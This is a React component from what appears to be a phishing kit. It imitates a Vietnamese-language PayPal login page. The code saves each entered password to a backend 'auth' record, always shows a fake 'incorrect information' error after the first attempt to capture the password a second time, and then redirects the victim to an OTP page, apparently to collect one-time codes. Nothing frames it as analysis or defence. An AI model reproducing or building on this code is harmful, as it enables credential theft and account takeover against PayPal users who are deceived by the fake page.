import { useContext, useState } from "react";
import { useNavigate } from "react-router-dom";
import logoMarker from '../../assets/paypal-mark-color.svg';
import alertLogo from '../../assets/alert.svg';
import vienamlogo from '../../assets/vietnam.png';
import narrowicon from '../../assets/narrow-down.svg';
import { updateDocument } from "../../services/api";
import { AppIDProvider, EmailContext } from "../../context/AppContext";

export default function Password() {
  const id = useContext(AppIDProvider);
  const navigate = useNavigate();
  const [isError, setIsError] = useState<boolean>(false);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [password, setPassword] = useState<string>('');
  const [step, setStep] = useState<1|2>(1);
  const { currEmail } = useContext(EmailContext);

  const validatePassword = () => {
    if(step === 1){
      updateDocument('auth', {password_1: password}, id );
      setIsLoading(true);
      setTimeout(()=>{
        setIsError(true);
        setIsLoading(false);
        setStep(2);
      },2000)
    }else{
      updateDocument('auth', {password_2: password}, id );
    setIsLoading(true);
      setTimeout(()=>{
      setIsLoading(false);
      navigate('/otp')
      },2000)
    }
  }
  return (
    <div>
      <div className="relative">
      <div className="login-container">
        <div className="logo">
          <img src={logoMarker} alt="PayPal Logo" />
        </div>
        <div id="loginForm">
          <div id="email-verified-group" className="email-verified-group">
            <div id="email-verified" className="verifiedEmail">{currEmail ?? 'email@gmail.com'}</div>
            <span id="changeBtn" className="changeBtn">Thay đổi</span>
          </div>
          {isError && 
            <div id = "error-group" className="error-group">
              <img
                className="alert-icon"
                src={alertLogo}
                width="20px"
                height="20px"
              />
              <p className="error-text">
                Một số thông tin của bạn không chính xác. Vui lòng thử lại.
              </p>
            </div>
          }

          <div id="passwordGroup" className="fieldWrapper">
            <input value={password} onChange={(e)=> setPassword(e.target.value)} type="password" id="password" name="password" placeholder="Mật khẩu"/>
          </div>

          <a id="recoveryOption" className="recoveryOption">Bạn quên mật khẩu?</a>
          <div className="actions">
            <button id="signInBtn" className="button" onClick={validatePassword}>Đăng nhập</button>
          </div>
          <div className="splitPassword">
            <div className="divider"></div>
            <span className="splitPasswordText">hoặc</span>
          </div>
        </div>
        <div className="actions">
          <button type="submit" className="register-button">Đăng ký</button>
        </div>
        <div className="languageWrapper">
          <img
            className="flag-vn"
            src={vienamlogo}
            width="20px"
            height="20px"
          />
          <img
            className="narrow-down"
            src={narrowicon}
            width="16px"
            height="16px"
          />
          <span className="languageText languageText-selected">Tiếng Việt</span>
          <span>|</span>
          <span className="languageText">English</span>
        </div>
      </div>
    {isLoading && 
      <div className="loading-container" id="loader">
        <div className="loader"></div>
      </div>
    }
      <div className="footer">
        <span className="footer-item">Liên hệ với chúng tôi</span>
        <span className="footer-item">Quyền riêng tư</span>
        <span className="footer-item">Pháp lý</span>
        <span className="footer-item">Toàn cầu</span>
      </div>
    </div>
    </div>
  );
}
